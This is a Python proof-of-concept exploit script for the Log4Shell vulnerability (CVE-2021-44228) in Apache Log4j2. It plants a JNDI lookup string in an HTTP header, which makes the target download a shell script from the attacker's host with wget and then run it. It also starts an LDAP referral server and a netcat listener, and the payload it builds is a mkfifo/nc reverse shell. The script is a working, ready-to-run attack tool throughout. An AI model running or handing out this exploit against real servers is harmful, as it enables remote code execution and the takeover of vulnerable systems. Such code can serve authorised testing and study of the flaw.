#!/usr/bin/env python3
#  -*- coding: utf-8 -*- #######################################################################################
#  ██▓     ▒█████    ▄████  ▄▄▄██▀▀▀██▀███   ▄████▄  ▓█████                                                    #
# ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒   ▒██  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                                    #
# ▒██░    ▒██░  ██▒▒██░▄▄▄░   ░██  ▓██ ░▄█ ▒▒▓█    ▄ ▒███                                                      #
# ▒██░    ▒██   ██░░▓█  ██▓▓██▄██▓ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                                    #
# ░██████▒░ ████▓▒░░▒▓███▀▒ ▓███▒  ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                                   #
# ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ▒▓▒▒░  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                                   #
# ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░▒░    ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                                   #
#   ░ ░   ░ ░ ░ ▒  ░ ░   ░  ░ ░ ░    ░░   ░ ░           ░                                                      #
#     ░  ░    ░ ░        ░  ░   ░     ░     ░ ░         ░  ░                                                   #
#                                          ░                                                                   #
#                                                                                                              #
# log4jrce - nighter@nighter.se                                                                      #
#                                                                                                              #
# DATE                                                                                                         #
# 15/12/2021                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2021-44228 - Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in      #
# configuration, log messages, and parameters do not protect against attacker controlled LDAP                  #
# and other JNDI related endpoints. An attacker who can control log messages or log message parameters can     #
# execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.                 #
# From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality       #
# has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect      #
# log4net, log4cxx, or other Apache Logging Services projects.                                                 #
#                                                                                                              #
# Disclaimer                                                                                                   #
#                                                                                                              #
# Wanted to build my own ldap refserver with the template I used from the Jolokia exploit                      #       
# but as a better refserver was already out there and wanted a working PoC quick as all the fuzz around this   #
# I just piggybacked on their work so no skills required for build this see reference to the bitbucket         #
# repositories used for the ldap refserver under JNDIExploit                                                   #
#                                                                                                              # 
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time
import requests
import base64
import http.server
import socketserver


from multiprocessing import Process


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def http_listner():
    
    PORT = 9999
    
    os.chdir('/tmp')
    Handler = http.server.SimpleHTTPRequestHandler
    
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[+] Serving at port: ", PORT)
        httpd.serve_forever()    


def prepare_payload():
    
    payload = '''#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n''' % (LHOST, LPORT)    

    with open('/tmp/payload.sh', 'w') as file:
        file.write(payload)    
    

def start_ldaprefserver():
    
    if os.path.isfile('.deps/JNDIExploit-1.2-SNAPSHOT.jar') is False:
        print('[-] Missing JNDIExploit-1.2-SNAPSHOT.jar file')
        os._exit(99)
    
    os.system("java -jar .deps/JNDIExploit-1.2-SNAPSHOT.jar -i %s -p 8888" % LHOST)

def exploit():

    time.sleep(5)
    print("[+] Exploit")

    command = 'wget http://%s:9999/payload.sh -O /tmp/payload.sh' % LHOST
    encoded = base64.b64encode(command.encode('utf-8'))
    
    payload = '''${jndi:ldap://%s:1389/Basic/Command/Base64/%s}''' % (LHOST, encoded.decode('utf-8'))
    headers = {'X-Api-Version': payload}

    r = requests.get('%s' % URL, headers=headers)
    if str(r.status_code).startswith('2'):
        print('[+] Payload staged successfully.')
    else:
        print('[+] Payload staging failed.')

    time.sleep(5)
    print('[+] Execute payload')

    command = 'sh -i /tmp/payload.sh'
    encoded = base64.b64encode(command.encode('utf-8'))
    
    payload = '''${jndi:ldap://%s:1389/Basic/Command/Base64/%s}''' % (LHOST, encoded.decode('utf-8'))
    headers = {'X-Api-Version': payload}

    r = requests.get('%s' % URL, headers=headers)
    #if str(r.status_code).startswith('2'):
    #    print('[+] Payload executed')    
    #else:
    #    print('[-] Payload failed')


# noinspection PyInterpreter
if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ██▓     ▒█████    ▄████  ▄▄▄██▀▀▀██▀███   ▄████▄  ▓█████ 
▓██▒    ▒██▒  ██▒ ██▒ ▀█▒   ▒██  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒██░    ▒██░  ██▒▒██░▄▄▄░   ░██  ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██░    ▒██   ██░░▓█  ██▓▓██▄██▓ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░██████▒░ ████▓▒░░▒▓███▀▒ ▓███▒  ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ▒▓▒▒░  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░▒░    ░▒ ░ ▒░  ░  ▒    ░ ░  ░
  ░ ░   ░ ░ ░ ▒  ░ ░   ░  ░ ░ ░    ░░   ░ ░           ░   
    ░  ░    ░ ░        ░  ░   ░     ░     ░ ░         ░  ░
                                          ░              
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./log4jrce.py 'http://127.0.0.1:8080' 192.168.1.75 7777\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
        
    prepare_payload()
    
    print("[+] LHOST: %s" % LHOST)

    # Run ldap server async
    p = Process(target=start_ldaprefserver)
    p.start()

    p = Process(target=http_listner)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat: %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)